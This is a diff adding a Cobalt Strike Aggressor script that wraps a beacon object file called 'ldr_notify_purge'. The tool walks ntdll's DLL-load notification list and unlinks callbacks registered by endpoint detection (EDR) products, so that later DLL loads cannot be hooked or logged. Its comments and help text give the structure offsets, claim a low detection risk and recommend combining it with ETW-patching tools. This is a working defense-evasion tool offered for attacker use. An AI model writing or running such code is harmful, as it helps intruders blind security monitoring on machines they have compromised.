@@ -1,0 +1,95 @@
+# ldr_notify_purge.cna — Aggressor script for ldr_notify_purge BOF
+#
+# Walk ntdll's LdrpDllNotificationList and unlink DLL load notification
+# callbacks registered by EDR DLLs in the current process.
+#
+# What this destroys:
+#   EDRs call LdrRegisterDllNotification when they inject their DLL so they
+#   are notified whenever a subsequent DLL loads. They use this to:
+#     (a) install inline hooks on the new DLL's exports
+#     (b) send DLL load telemetry to the EDR service
+#   After purge, loading a reflective DLL or any LoadLibrary call is INVISIBLE
+#   to the EDR — it cannot hook the new DLL, cannot log the load event.
+#
+# This is different from "unhooking":
+#   Unhooking removes hooks from ALREADY-LOADED DLLs.
+#   LDR notify purge prevents hooks on ALL FUTURE DLL LOADS.
+#   Combine both for full hook elimination.
+#
+# Stealth:
+#   - No API calls that trigger EDR monitoring (direct list manipulation)
+#   - Removed entries are made self-referential — EDR's own unregister() is a no-op
+#   - Only detectable by periodic EDR self-check (rare in production EDRs)
+#
+# Usage:
+#   ldr_notify_purge list    show all registered DLL notification callbacks
+#   ldr_notify_purge purge   remove all non-system (EDR) callbacks
+
+alias ldr_notify_purge {
+    local('$bof $args $bid $handle $path $mode');
+    $bid  = $1;
+    $path = script_resource("ldr_notify_purge.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[ldr_notify_purge] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[ldr_notify_purge] readb failed: " . $path);
+        return;
+    }
+    println("[ldr_notify_purge] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) == 1) {
+        berror($bid, "[ldr_notify_purge] Usage:\n" .
+            "  ldr_notify_purge list    enumerate DLL notification callbacks\n" .
+            "  ldr_notify_purge purge   remove EDR DLL notification callbacks");
+        return;
+    }
+
+    if ($2 eq "purge") {
+        $mode = 1;
+        btask($bid, "LDR Notify Purge: removing non-system DLL notification callbacks");
+    } else {
+        $mode = 0;
+        btask($bid, "LDR Notify Purge: listing DLL notification callbacks");
+    }
+
+    $args = bof_pack("i", $mode);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "ldr_notify_purge",
+    "Remove EDR DLL load notification callbacks from LdrpDllNotificationList",
+    "Usage:\n" .
+    "  ldr_notify_purge list    enumerate all LdrRegisterDllNotification callbacks\n" .
+    "  ldr_notify_purge purge   unlink all non-system (EDR) callbacks\n\n" .
+    "Examples:\n" .
+    "  ldr_notify_purge list\n" .
+    "  ldr_notify_purge purge\n\n" .
+    "Mechanism:\n" .
+    "  ntdll!LdrRegisterDllNotification stores callbacks in a circular linked list\n" .
+    "  (LdrpDllNotificationList in ntdll data section). Each entry has:\n" .
+    "    +0x00  LIST_ENTRY Links   (Flink/Blink)\n" .
+    "    +0x10  PVOID      Callback  (function pointer in EDR DLL)\n" .
+    "    +0x18  PVOID      Context\n\n" .
+    "  'purge' mode unlinks all entries whose Callback is NOT in ntdll/kernel32/kernelbase.\n" .
+    "  Removed entries are made self-referential so LdrUnregisterDllNotification(oldCookie)\n" .
+    "  by the EDR DLL becomes a safe no-op instead of a crash.\n\n" .
+    "Effect after purge:\n" .
+    "  Any DLL loaded into this process (LoadLibrary, reflective load, LdrLoadDll)\n" .
+    "  will NOT trigger EDR notification. The EDR cannot:\n" .
+    "    - Hook the newly loaded DLL's API exports\n" .
+    "    - Log the DLL load to telemetry\n" .
+    "    - Inspect the DLL content on load\n\n" .
+    "Detection risk: LOW\n" .
+    "  - No suspicious API calls\n" .
+    "  - Session/service state unchanged\n" .
+    "  - Detectable only by EDR self-integrity check (periodic hook validation)\n\n" .
+    "Requires: admin rights (to read EDR DLL base via VirtualQuery)\n" .
+    "Combine with: etwpatch, etw_tamper starve, nrpt_sinkhole, null_route"
+);
